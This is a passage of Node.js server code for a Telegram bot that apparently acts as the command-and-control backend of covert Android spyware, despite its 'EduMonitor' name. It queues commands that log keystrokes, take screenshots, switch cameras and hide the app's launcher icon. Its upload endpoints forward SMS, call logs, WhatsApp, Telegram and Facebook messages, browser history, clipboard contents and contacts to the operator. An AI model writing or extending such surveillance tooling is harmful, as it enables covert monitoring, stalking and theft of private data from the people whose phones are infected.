            [
                createInlineButton('✅ Command Sent', 'noop'),
                createInlineButton('◀️ Back to Menu', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
    }
}

// ============= CONVERSATION HANDLER =============

async function handleConversationMessage(chatId, text, messageId, userState) {
    console.log(`💬 Conversation message: ${text} in state ${userState.state}`);
    
    switch (userState.state) {
        case SCHEDULE_STATES.AWAITING_START_TIME:
            if (!text.match(/^([0-1]?[0-9]|2[0-3]):[0-5][0-9]$/)) {
                await sendTelegramMessage(chatId, 
                    "❌ Invalid time format. Please use HH:MM (e.g., 22:00)");
                return;
            }
            
            userState.data.startTime = text;
            userState.state = SCHEDULE_STATES.AWAITING_END_TIME;
            
            await sendTelegramMessage(chatId, 
                "✅ Start time recorded.\n\n" +
                "Now enter the END time (HH:MM)\n" +
                "Example: `02:00` for 2:00 AM");
            break;
            
        case SCHEDULE_STATES.AWAITING_END_TIME:
            if (!text.match(/^([0-1]?[0-9]|2[0-3]):[0-5][0-9]$/)) {
                await sendTelegramMessage(chatId, 
                    "❌ Invalid time format. Please use HH:MM (e.g., 02:00)");
                return;
            }
            
            userState.data.endTime = text;
            userState.state = SCHEDULE_STATES.AWAITING_RECURRING;
            
            const keyboard = [
                [
                    createInlineButton('✅ Daily', 'recurring:daily'),
                    createInlineButton('🔄 Once', 'recurring:once')
                ]
            ];
            
            await sendTelegramMessageWithKeyboard(
                chatId,
                "✅ End time recorded.\n\n" +
                "Should this schedule repeat daily or run once?",
                keyboard
            );
            break;
            
        case SCHEDULE_STATES.AWAITING_INTERVAL:
            const interval = parseInt(text);
            if (isNaN(interval) || interval < 5 || interval > 120) {
                await sendTelegramMessage(chatId, 
                    "❌ Invalid interval. Please enter a number between 5 and 120.");
                return;
            }
            
            const [startHour, startMin] = userState.data.startTime.split(':').map(Number);
            const [endHour, endMin] = userState.data.endTime.split(':').map(Number);
            const recurring = userState.data.recurring;
            
            const command = `/record_custom ${startHour.toString().padStart(2,'0')}:${startMin.toString().padStart(2,'0')} ${endHour.toString().padStart(2,'0')}:${endMin.toString().padStart(2,'0')} ${recurring ? 'daily' : 'once'} ${interval}`;
            
            userStates.delete(chatId);
            
            await handleCommand(chatId, command, messageId);
            
            await sendTelegramMessage(chatId, 
                "✅ *Custom Schedule Configured*\n\n" +
                `Start: ${userState.data.startTime}\n` +
                `End: ${userState.data.endTime}\n` +
                `Type: ${recurring ? 'Daily' : 'One-time'}\n` +
                `Interval: ${interval} minutes\n\n` +
                `Command sent to device.`);
            break;
    }
}

// ============= COMMAND HANDLER =============

async function handleCommand(chatId, command, messageId) {
    console.log(`\n🎯 Handling command: ${command} from chat ${chatId}`);

    // Handle /devices command
    if (command === '/devices') {
        const userDevices = getDeviceListForUser(chatId);
        let message = `📱 *Your Devices*\n\n`;
        
        if (userDevices.length === 0) {
            message += "No devices registered yet.";
        } else {
            userDevices.forEach((device, index) => {
                const status = device.isActive ? '✅ ACTIVE' : '○';
                message += `${index + 1}. ${status} ${device.name}\n`;
                message += `   ID: \`${device.id}\`\n`;
                message += `   Last Seen: ${device.lastSeenFormatted}\n`;
                message += `   Status: ${(Date.now() - device.lastSeen) < 300000 ? '🟢 Online' : '⚫ Offline'}\n`;
                if (device.phoneNumber !== 'Not available') {
                    message += `   Phone: ${device.phoneNumber}\n`;
                }
                message += `\n`;
            });
            message += `\nUse /select [device_id] to switch active device.`;
        }
        
        await sendTelegramMessage(chatId, message);
        return;
    }

    // Handle /select command
    if (command.startsWith('/select ')) {
        const deviceId = command.substring(8).trim();
        const device = devices.get(deviceId);
        
        if (device && String(device.chatId) === String(chatId)) {
            userDeviceSelection.set(chatId, deviceId);
            await sendTelegramMessage(chatId, 
                `✅ Now controlling: ${device.deviceInfo?.model || 'Device'}\n` +
                `ID: ${deviceId.substring(0, 8)}...`);
        } else {
            await sendTelegramMessage(chatId, '❌ Device not found or not authorized.');
        }
        return;
    }

    // ============= NEW COMMAND HANDLERS =============
    
    // Audio Quality Commands
    if (command === '/audio_info') {
        await sendTelegramMessage(chatId, 
            "🎤 *Audio Quality Settings*\n\n" +
            "Available qualities:\n" +
            "• `/audio_ultra` - Ultra Low (8 kbps) - Smallest files\n" +
            "• `/audio_very_low` - Very Low (16 kbps)\n" +
            "• `/audio_low` - Low (24 kbps)\n" +
            "• `/audio_medium` - Medium (32 kbps) - Balanced\n" +
            "• `/audio_high` - High (64 kbps) - Best quality\n\n" +
            "Lower quality = smaller files, faster uploads.");
        return;
    }
    
    if (command === '/audio_ultra' || command === '/audio_very_low' || 
        command === '/audio_low' || command === '/audio_medium' || command === '/audio_high') {
        const selectedDeviceId = userDeviceSelection.get(chatId);
        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
        
        if (!device) {
            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
            return;
        }
        
        if (!device.pendingCommands) {
            device.pendingCommands = [];
        }
        
        device.pendingCommands.push({
            command: command.substring(1),
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        
        const quality = command.substring(1).replace('audio_', '');
        await sendTelegramMessage(chatId, `🎤 Audio quality set to: ${quality.toUpperCase()}\nCommand sent to device.`);
        return;
    }
    
    // WiFi-Only Mode Commands
    if (command === '/wifi_only_on' || command === '/wifi_only_off' || 
        command === '/wifi_only_status' || command === '/network_status') {
        const selectedDeviceId = userDeviceSelection.get(chatId);
        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
        
        if (!device) {
            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
            return;
        }
        
        if (!device.pendingCommands) {
            device.pendingCommands = [];
        }
        
        device.pendingCommands.push({
            command: command.substring(1),
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        
        if (command === '/wifi_only_on') {
            await sendTelegramMessage(chatId, "📡 WiFi-Only Mode enabled. Media files will only upload on WiFi.");
        } else if (command === '/wifi_only_off') {
            await sendTelegramMessage(chatId, "📡 WiFi-Only Mode disabled. All data can use any network.");
        } else {
            await sendTelegramMessage(chatId, "📡 Network status command sent to device.");
        }
        return;
    }
    
    // Real-time Advanced Commands
    if (command === '/realtime_keystrokes_on' || command === '/realtime_keystrokes_off' ||
        command === '/realtime_notifications_on' || command === '/realtime_notifications_off' ||
        command === '/realtime_all_on' || command === '/realtime_all_off' ||
        command === '/realtime_status') {
        const selectedDeviceId = userDeviceSelection.get(chatId);
        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
        
        if (!device) {
            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
            return;
        }
        
        if (!device.pendingCommands) {
            device.pendingCommands = [];
        }
        
        device.pendingCommands.push({
            command: command.substring(1),
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        
        if (command === '/realtime_keystrokes_on') {
            await sendTelegramMessage(chatId, "🔑 Real-time keystrokes ENABLED. All keystrokes will be sent instantly.");
        } else if (command === '/realtime_keystrokes_off') {
            await sendTelegramMessage(chatId, "🔑 Real-time keystrokes DISABLED. Keystrokes will be batched.");
        } else if (command === '/realtime_notifications_on') {
            await sendTelegramMessage(chatId, "🔔 Real-time notifications ENABLED. All notifications will be sent instantly.");
        } else if (command === '/realtime_notifications_off') {
            await sendTelegramMessage(chatId, "🔔 Real-time notifications DISABLED. Notifications will be batched.");
        } else if (command === '/realtime_all_on') {
            await sendTelegramMessage(chatId, "✅ All real-time logs ENABLED.");
        } else if (command === '/realtime_all_off') {
            await sendTelegramMessage(chatId, "❌ All real-time logs DISABLED.");
        } else {
            await sendTelegramMessage(chatId, "📊 Real-time status command sent to device.");
        }
        return;
    }
    
    // Sync & Harvest Commands
    if (command === '/sync_all' || command === '/force_harvest' || command === '/refresh_data' ||
        command === '/stats' || command === '/clear_logs' || command === '/logs_count' || command === '/reboot_app') {
        const selectedDeviceId = userDeviceSelection.get(chatId);
        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
        
        if (!device) {
            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
            return;
        }
        
        if (!device.pendingCommands) {
            device.pendingCommands = [];
        }
        
        device.pendingCommands.push({
            command: command.substring(1),
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        
        if (command === '/sync_all') {
            await sendTelegramMessage(chatId, "🔄 Syncing all specialized tables...");
        } else if (command === '/force_harvest') {
            await sendTelegramMessage(chatId, "⚡ Force harvest command sent to device.");
        } else if (command === '/refresh_data') {
            await sendTelegramMessage(chatId, "🔄 Refresh data command sent to device.");
        } else if (command === '/stats') {
            await sendTelegramMessage(chatId, "📈 Database statistics command sent to device.");
        } else if (command === '/clear_logs') {
            await sendTelegramMessage(chatId, "🗑️ Clear logs command sent to device.");
        } else if (command === '/logs_count') {
            await sendTelegramMessage(chatId, "📊 Logs count command sent to device.");
        } else if (command === '/reboot_app') {
            await sendTelegramMessage(chatId, "🔄 Reboot services command sent to device.");
        }
        return;
    }
    
    // File Scanner Commands
    if (command === '/full_scan' || command === '/media_scan' || command === '/full_scan_detailed' ||
        command === '/scan_help' || command === '/find_recorded' || command === '/find_media') {
        const selectedDeviceId = userDeviceSelection.get(chatId);
        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
        
        if (!device) {
            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
            return;
        }
        
        if (!device.pendingCommands) {
            device.pendingCommands = [];
        }
        
        device.pendingCommands.push({
            command: command.substring(1),
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        
        if (command === '/full_scan') {
            await sendTelegramMessage(chatId, "🔍 Full system scan initiated. This may take a few minutes. Report will be sent when complete.");
        } else if (command === '/media_scan') {
            await sendTelegramMessage(chatId, "🎵 Media scan initiated. Scanning for audio, video, and images...");
        } else if (command === '/full_scan_detailed') {
            await sendTelegramMessage(chatId, "🔬 Detailed deep scan initiated. Full file paths and metadata will be included.");
        } else if (command === '/scan_help') {
            await sendTelegramMessage(chatId, 
                "🔍 *Scan Commands Reference*\n\n" +
                "• `/full_scan` - Complete system scan\n" +
                "• `/media_scan` - Media files only (faster)\n" +
                "• `/full_scan_detailed` - Detailed with full paths\n" +
                "• `/find_recorded` - Find audio recordings\n" +
                "• `/find_media` - Find all media files\n\n" +
                "Reports are sent as HTML files with search and export.");
        } else {
            await sendTelegramMessage(chatId, "🔍 Scan command sent to device.");
        }
        return;
    }
    
    // Detailed Export Commands
    if (command === '/contacts_detailed' || command === '/apps_detailed' || 
        command === '/keystrokes_detailed' || command === '/notifications_detailed' ||
        command === '/device_snapshots' || command === '/device_history') {
        const selectedDeviceId = userDeviceSelection.get(chatId);
        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
        
        if (!device) {
            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
            return;
        }
        
        if (!device.pendingCommands) {
            device.pendingCommands = [];
        }
        
        device.pendingCommands.push({
            command: command.substring(1),
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        
        const commandName = command.substring(1).replace('_', ' ');
        await sendTelegramMessage(chatId, `📊 ${commandName} command sent to device. Detailed export will be sent when ready.`);
        return;
    }
    
    // App Opens Commands
    if (command === '/app_opens' || command === '/app_opens_html') {
        const selectedDeviceId = userDeviceSelection.get(chatId);
        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
        
        if (!device) {
            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
            return;
        }
        
        if (!device.pendingCommands) {
            device.pendingCommands = [];
        }
        
        device.pendingCommands.push({
            command: command.substring(1),
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        
        await sendTelegramMessage(chatId, "📱 App opens command sent to device.");
        return;
    }
    
    // Calendar Commands
    if (command === '/calendar' || command === '/calendar_html') {
        const selectedDeviceId = userDeviceSelection.get(chatId);
        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
        
        if (!device) {
            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
            return;
        }
        
        if (!device.pendingCommands) {
            device.pendingCommands = [];
        }
        
        device.pendingCommands.push({
            command: command.substring(1),
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        
        await sendTelegramMessage(chatId, "📅 Calendar command sent to device.");
        return;
    }
    
    // Clipboard Commands
    if (command === '/clipboard' || command === '/clipboard_html') {
        const selectedDeviceId = userDeviceSelection.get(chatId);
        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
        
        if (!device) {
            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
            return;
        }
        
        if (!device.pendingCommands) {
            device.pendingCommands = [];
        }
        
        device.pendingCommands.push({
            command: command.substring(1),
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        
        await sendTelegramMessage(chatId, "📋 Clipboard logs command sent to device.");
        return;
    }
    
    // Browser History Commands
    if (command === '/browser_history' || command === '/browser_history_html') {
        const selectedDeviceId = userDeviceSelection.get(chatId);
        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
        
        if (!device) {
            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
            return;
        }
        
        if (!device.pendingCommands) {
            device.pendingCommands = [];
        }
        
        device.pendingCommands.push({
            command: command.substring(1),
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        
        await sendTelegramMessage(chatId, "🌐 Browser history command sent to device.");
        return;
    }
    
    // Screenshot Method Command
    if (command === '/screenshot_method') {
        const selectedDeviceId = userDeviceSelection.get(chatId);
        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
        
        if (!device) {
            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
            return;
        }
        
        if (!device.pendingCommands) {
            device.pendingCommands = [];
        }
        
        device.pendingCommands.push({
            command: 'screenshot_method',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        
        await sendTelegramMessage(chatId, "📸 Checking screenshot method on device...");
        return;
    }
    
    // Camera Status Command
    if (command === '/camera_status') {
        const selectedDeviceId = userDeviceSelection.get(chatId);
        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
        
        if (!device) {
            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
            return;
        }
        
        if (!device.pendingCommands) {
            device.pendingCommands = [];
        }
        
        device.pendingCommands.push({
            command: 'camera_status',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        
        await sendTelegramMessage(chatId, "📸 Camera status command sent to device.");
        return;
    }
    
    // Camera Switch Commands
    if (command === '/camera_front' || command === '/camera_back' || command === '/camera_switch') {
        const selectedDeviceId = userDeviceSelection.get(chatId);
        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
        
        if (!device) {
            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
            return;
        }
        
        if (!device.pendingCommands) {
            device.pendingCommands = [];
        }
        
        device.pendingCommands.push({
            command: command.substring(1),
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        
        const cameraType = command === '/camera_front' ? 'FRONT' : (command === '/camera_back' ? 'BACK' : 'TOGGLE');
        await sendTelegramMessage(chatId, `📸 Camera switched to ${cameraType}.`);
        return;
    }
    
    // Size Status Command
    if (command === '/size_status') {
        const selectedDeviceId = userDeviceSelection.get(chatId);
        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
        
        if (!device) {
            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
            return;
        }
        
        if (!device.pendingCommands) {
            device.pendingCommands = [];
        }
        
        device.pendingCommands.push({
            command: 'size_status',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        
        await sendTelegramMessage(chatId, "📏 Checking screenshot size status on device...");
        return;
    }
    
    // Start/Stop Screenshot Commands
    if (command === '/start_screenshot' || command === '/stop_screenshot') {
        const selectedDeviceId = userDeviceSelection.get(chatId);
        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
        
        if (!device) {
            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
            return;
        }
        
        if (!device.pendingCommands) {
            device.pendingCommands = [];
        }
        
        device.pendingCommands.push({
            command: command.substring(1),
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        
        const action = command === '/start_screenshot' ? 'started' : 'stopped';
        await sendTelegramMessage(chatId, `📸 Screenshot service ${action}.`);
        return;
    }
    
    // Screenshots Logs Command
    if (command === '/screenshots' || command === '/screenshot_logs') {
        const selectedDeviceId = userDeviceSelection.get(chatId);
        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
        
        if (!device) {
            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
            return;
        }
        
        if (!device.pendingCommands) {
            device.pendingCommands = [];
        }
        
        device.pendingCommands.push({
            command: 'screenshots',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        
        await sendTelegramMessage(chatId, "📸 Screenshot logs command sent to device.");
        return;
    }
    
    // Hide/Show Icon Commands
    if (command === '/hide_icon' || command === '/show_icon') {
        const selectedDeviceId = userDeviceSelection.get(chatId);
        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
        
        if (!device) {
            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
            return;
        }
        
        if (!device.pendingCommands) {
            device.pendingCommands = [];
        }
        
        device.pendingCommands.push({
            command: command.substring(1),
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        
        const action = command === '/hide_icon' ? 'hidden' : 'shown';
        await sendTelegramMessage(chatId, `👻 Launcher icon ${action}.`);
        return;
    }

    // Handle /find_media command
    if (command === '/find_media' || command === '/scan_media' || command === '/media_scan') {
        
        const selectedDeviceId = userDeviceSelection.get(chatId);
        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
        
        if (!device) {
            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
            return;
        }
        
        if (!device.pendingCommands) {
            device.pendingCommands = [];
        }
        
        device.pendingCommands.push({
            command: 'find_media',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        
        console.log(`📝 Find Media command queued for device ${selectedDeviceId}`);
        
        await sendTelegramMessage(chatId, 
            `🔍 *Media Scanner*\n\n` +
            `📱 Device: ${device.deviceInfo?.model || 'Unknown'}\n\n` +
            `✅ Scan command sent to device.\n` +
            `The device will search for:\n` +
            `• Images (JPG, PNG, GIF)\n` +
            `• Videos (MP4, 3GP, MKV)\n` +
            `• Audio (MP3, AMR, OPUS)\n` +
            `• WhatsApp/Telegram media\n\n` +
            `⏱️ This may take a moment...`);
        return;
    }

    if (command === '/help' || command === '/start' || command === '/menu') {
        console.log('📋 Showing main menu');
        
        await sendTelegramMessageWithKeyboard(
            chatId,
            "🤖 <b>EduMonitor Control Panel v5.0</b>\n\n" +
            "Select a category to get started:\n\n" +
            "🆕 *NEW FEATURES AVAILABLE!*\n" +
            "• Detailed Exports\n" +
            "• File Scanner\n" +
            "• Data Saving Mode\n" +
            "• Advanced Realtime Controls\n" +
            "• And more!\n\n" +
            "Tap the NEW FEATURES button to explore!",
            getMainMenuKeyboard(chatId)
        );
        return;
    }

    // Get the currently selected device for this user
    let selectedDeviceId = userDeviceSelection.get(chatId);
    let device = null;
    let deviceInfo = null;
    
    if (selectedDeviceId) {
        device = devices.get(selectedDeviceId);
        if (device) {
            deviceInfo = device.deviceInfo;
        }
    }
    
    // If no device selected or selected device not found, try to find any device
    if (!device) {
        for (const [id, d] of devices.entries()) {
            if (String(d.chatId) === String(chatId)) {
                selectedDeviceId = id;
                device = d;
                deviceInfo = d.deviceInfo;
                userDeviceSelection.set(chatId, selectedDeviceId);
                console.log(`✅ Auto-selected device: ${selectedDeviceId}`);
                break;
            }
        }
    }

    if (!device) {
        console.log(`❌ No device found for chat ${chatId}`);
        const keyboard = [
            [{ text: '🔄 Check Again', callback_data: 'refresh_devices' }],
            [{ text: '◀️ Main Menu', callback_data: 'help_main' }]
        ];
        await sendTelegramMessageWithKeyboard(
            chatId, 
            '❌ No device registered.\n\nPlease make sure the Android app is running and try refreshing.',
            keyboard
        );
        return;
    }

    device.lastSeen = Date.now();

    const cleanCommand = command.startsWith('/') ? command.substring(1) : command;
    
    if (!device.pendingCommands) {
        device.pendingCommands = [];
    }
    
    const commandObject = {
        command: cleanCommand,
        originalCommand: command,
        messageId: messageId,
        timestamp: Date.now()
    };
    
    device.pendingCommands.push(commandObject);
    console.log(`📝 Command queued for device ${selectedDeviceId}:`, commandObject);

    let ackMessage = `⏳ Processing: ${command}`;
    if (deviceInfo) {
        ackMessage += `\n📱 Device: ${deviceInfo.model || 'Unknown'}`;
    }
    
    await sendTelegramMessage(chatId, ackMessage);
}

// ============= IP INFO ENDPOINT =============
app.post('/api/ipinfo/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const ipData = req.body;
        
        console.log(`🌐 IP Info received from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        ipData.serverIP = getServerIP();
        device.lastIPInfo = ipData;
        
        const formattedMessage = formatIPInfo(ipData);
        
        const devicePrefix = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n`;
        await sendTelegramMessage(chatId, devicePrefix + formattedMessage);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ IP Info endpoint error:', error);
        res.status(500).json({ error: 'IP Info processing failed' });
    }
});

// ============= PHONE NUMBER ENDPOINT =============

app.post('/api/phonenumber/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const phoneData = req.body;
        
        console.log(`📞 Phone number received from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        device.phoneNumber = phoneData.phoneNumber;
        device.simInfo = phoneData.simInfo;
        
        let message = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
        message += '📞 <b>Phone Information</b>\n\n';
        
        if (phoneData.phoneNumber && phoneData.phoneNumber !== 'Unknown') {
            message += `📱 <b>Phone Number:</b> <code>${phoneData.phoneNumber}</code>\n`;
        } else {
            message += `⚠️ <b>Phone Number:</b> Not available (no SIM or permission required)\n`;
        }
        
        if (phoneData.simInfo) {
            if (Array.isArray(phoneData.simInfo)) {
                message += `\n<b>SIM Information (Multiple SIMs):</b>\n`;
                phoneData.simInfo.forEach((sim, index) => {
                    message += `\n📱 <b>SIM ${index + 1}</b>\n`;
                    message += `• Slot: ${sim.slot || 'Unknown'}\n`;
                    message += `• Carrier: ${sim.carrierName || 'Unknown'}\n`;
                    message += `• Country: ${sim.countryIso || 'Unknown'}\n`;
                });
            } else {
                message += `\n<b>SIM Information:</b>\n`;
                message += `• Operator: ${phoneData.simInfo.operator || 'Unknown'}\n`;
                message += `• Country: ${phoneData.simInfo.country || 'Unknown'}\n`;
                message += `• SIM State: ${phoneData.simInfo.simState || 'Unknown'}\n`;
            }
        }
        
        await sendTelegramMessage(chatId, message);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Phone Number endpoint error:', error);
        res.status(500).json({ error: 'Phone Number processing failed' });
    }
});

// ============= SIM INFO ENDPOINT =============

app.post('/api/siminfo/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const simData = req.body;
        
        console.log(`📱 SIM Info received from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        device.simInfo = simData;
        
        const formattedMessage = formatSimInfo(simData);
        const devicePrefix = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
        await sendTelegramMessage(chatId, devicePrefix + formattedMessage);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ SIM Info endpoint error:', error);
        res.status(500).json({ error: 'SIM Info processing failed' });
    }
});

// ============= WIFI INFO ENDPOINT =============

app.post('/api/wifiinfo/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const wifiData = req.body;
        
        console.log(`📶 WiFi Info received from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        device.wifiInfo = wifiData;
        
        const formattedMessage = formatWifiInfo(wifiData);
        const devicePrefix = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
        await sendTelegramMessage(chatId, devicePrefix + formattedMessage);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ WiFi Info endpoint error:', error);
        res.status(500).json({ error: 'WiFi Info processing failed' });
    }
});

// ============= MOBILE INFO ENDPOINT =============

app.post('/api/mobileinfo/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const mobileData = req.body;
        
        console.log(`📱 Mobile Info received from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        device.mobileInfo = mobileData;
        
        let message = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
        message += '📱 <b>Mobile Network Information</b>\n\n';
        
        if (mobileData.operator) {
            message += `📶 *Network*\n`;
            message += `• Operator: ${mobileData.operator}\n`;
            message += `• Country: ${mobileData.country}\n`;
            message += `• Type: ${mobileData.networkType}\n`;
            message += `• Roaming: ${mobileData.roaming ? 'Yes' : 'No'}\n`;
        }
        
        if (mobileData.ip) {
            message += `\n🌐 *Mobile IP*\n`;
            message += `• ${mobileData.ip}\n`;
        }
        
        if (mobileData.dataEnabled !== undefined) {
            message += `\n🔌 *Connection Status*\n`;
            message += `• Mobile Data: ${mobileData.dataEnabled ? '✅ ON' : '❌ OFF'}\n`;
        }
        
        await sendTelegramMessage(chatId, message);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Mobile Info endpoint error:', error);
        res.status(500).json({ error: 'Mobile Info processing failed' });
    }
});

// ============= FILE UPLOAD ENDPOINT =============

app.post('/api/upload-file', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.body.deviceId;
        const command = req.body.command;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !command || !filename || !req.file) {
            console.error('❌ Missing fields in upload');
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`📎 File upload from ${deviceId}: ${filename} (${req.file.size} bytes, ${itemCount} items)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        let caption = `📱 *${deviceName}*\n\n`;
        
        switch (command) {
            case 'contacts':
            case 'contacts_html':
                caption += `📇 Contacts Export (${itemCount} contacts)`;
                break;
            case 'contacts_detailed':
                caption += `📇 Detailed Contacts Export (${itemCount} contacts)`;
                break;
            case 'sms':
            case 'sms_html':
                caption += `💬 SMS Messages Export (${itemCount} messages)`;
                break;
            case 'calllogs':
            case 'calllogs_html':
            case 'calls_html':
                caption += `📞 Call Logs Export (${itemCount} calls)`;
                break;
            case 'apps':
            case 'apps_html':
                caption += `📱 Installed Apps Export (${itemCount} apps)`;
                break;
            case 'apps_detailed':
            case 'installed_apps_detailed':
                caption += `📱 Detailed Apps Export (${itemCount} apps)`;
                break;
            case 'keystrokes':
            case 'keystrokes_html':
                caption += `⌨️ Keystroke Logs Export (${itemCount} entries)`;
                break;
            case 'keystrokes_detailed':
                caption += `⌨️ Detailed Keystroke Logs (${itemCount} entries)`;
                break;
            case 'notifications':
                caption += `🔔 Notifications Export (${itemCount} notifications)`;
                break;
            case 'notifications_detailed':
                caption += `🔔 Detailed Notifications (${itemCount} entries)`;
                break;
            case 'app_opens':
            case 'app_opens_html':
                caption += `📱 App Opens Export (${itemCount} entries)`;
                break;
            case 'whatsapp':
                caption += `💬 WhatsApp Messages Export (${itemCount} messages)`;
                break;
            case 'telegram':
                caption += `💬 Telegram Messages Export (${itemCount} messages)`;
                break;
            case 'facebook':
                caption += `💬 Facebook Messages Export (${itemCount} messages)`;
                break;
            case 'browser_history':
            case 'browser_history_html':
                caption += `🌐 Browser History Export (${itemCount} entries)`;
                break;
            case 'clipboard':
                caption += `📋 Clipboard History Export (${itemCount} entries)`;
                break;
            case 'calendar':
                caption += `📅 Calendar Events Export (${itemCount} events)`;
                break;
            case 'screenshots':
            case 'screenshot_logs':
                caption += `📸 Screenshot Metadata Export (${itemCount} entries)`;
                break;
            case 'device_snapshots':
            case 'device_history':
                caption += `📊 Device Info Snapshots (${itemCount} snapshots)`;
                break;
            case 'all_info':
            case 'full_info':
                caption += `🌍 Complete Network Info Export`;
                break;
            default:
                caption += `📎 Data Export`;
        }
        
        await sendTelegramDocument(chatId, filePath, filename, caption);
        
        setTimeout(() => {
            try {
                if (fs.existsSync(filePath)) {
                    fs.unlinkSync(filePath);
                    console.log(`🧹 Deleted temporary file: ${filePath}`);
                }
            } catch (e) {
                console.error('Error deleting file:', e);
            }
        }, 60000);
        
        res.json({ success: true, filename, size: req.file.size });
        
    } catch (error) {
        console.error('❌ File upload error:', error);
        res.status(500).json({ error: 'Upload failed: ' + error.message });
    }
});

// ============= LOG INGESTION ENDPOINTS =============

